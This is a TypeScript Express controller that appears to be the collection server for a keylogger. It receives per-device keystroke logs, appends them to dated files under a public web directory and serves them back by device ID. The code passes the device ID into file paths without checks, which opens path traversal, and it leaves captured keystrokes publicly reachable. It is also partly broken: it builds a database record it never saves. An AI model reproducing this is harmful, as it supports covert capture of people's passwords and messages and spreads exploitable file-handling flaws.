import fs from "fs";
import path from "path";
import { Request, Response } from "express";
import { validationResult } from "express-validator";
import KeyLogs from "../models/keylogs.model";
import { KeyLogsModelType } from "../utils";

// Add New KeyLogs
// export const addNewKeyLogs = async (data: any) => {
// 	try {
// 		const { deviceId, keyLogsType, keylogs, event } = data;

// 		const newKeyLog: KeyLogsModelType = new KeyLogs({
// 			deviceId,
// 			keyLogsType,
// 			keylogs: keylogs,
// 			keyevent: event,
// 		});

// 		await newKeyLog.save();

// 		return { status: 200, message: "Key logs added successfully" };
// 	} catch (error) {
// 		console.error("Error adding key logs:", error);
// 		return { status: 500, error: "Failed to add key logs" };
// 	}
// };
export const addNewKeyLogs = async (data: any) => {
	try {
		const { deviceId, keyLogsType, keylogs, event } = data;

		// Check if keylogs is not an empty string
		if (!keylogs || keylogs.trim() === "[]") {
			return {
				status: 400,
				message: "Key logs are empty, nothing to save",
			};
		}

		const newKeyLog: KeyLogsModelType = new KeyLogs({
			deviceId,
			keyLogsType,
			keylogs: keylogs,
			keyevent: event,
		});

		// Create a username folder if it doesn't exist
		const logsDir = path.join(__dirname, "../../public/keylogs", deviceId);
		if (!fs.existsSync(logsDir)) {
			fs.mkdirSync(logsDir, { recursive: true });
		}

		// Get today's date in YYYY-MM-DD format
		const today = new Date().toISOString().split("T")[0];
		const filePath = path.join(logsDir, `${today}.txt`);

		// Prepare the log entry
		const logEntry = `${new Date().toISOString()} - ${keyLogsType}: ${keylogs}, Event: ${event}\n`;

		// Append the log entry to the file
		fs.appendFileSync(filePath, logEntry);
	} catch (error) {
		console.error("Error adding key logs:", error);
		return { status: 500, error: "Failed to add key logs" };
	}
};

// Get Key Logs by DeviceId
export const getKeyLogsFiles = async (req: Request, res: Response) => {
	const errors = validationResult(req);
	if (!errors.isEmpty()) {
		return res.status(400).json({ errors: errors.array() });
	}

	const { deviceId } = req.params;

	try {
		// Assuming the keylogs are stored in public/keylogs/username
		const logsDir = path.join(__dirname, "../../public/keylogs", deviceId); // Adjust path as needed

		// Check if the directory exists
		if (!fs.existsSync(logsDir)) {
			return res
				.status(404)
				.json({ message: "No logs found for this device" });
		}

		// Read all .txt files in the directory
		const files = fs
			.readdirSync(logsDir)
			.filter((file) => file.endsWith(".txt"));

		// Initialize an array to store the content of each file
		const logs = [];

		// Read the content of each file and push it to the logs array
		for (const file of files) {
			const filePath = path.join(logsDir, file);
			const content = fs.readFileSync(filePath, "utf8");
			logs.push({ filename: file, content });
		}

		// Return the array of logs
		res.status(200).json(logs);
	} catch (error) {
		console.error("Error processing keylogs:", error);
		res.status(500).json({ error: "Failed to process the keylogs" });
	}
};
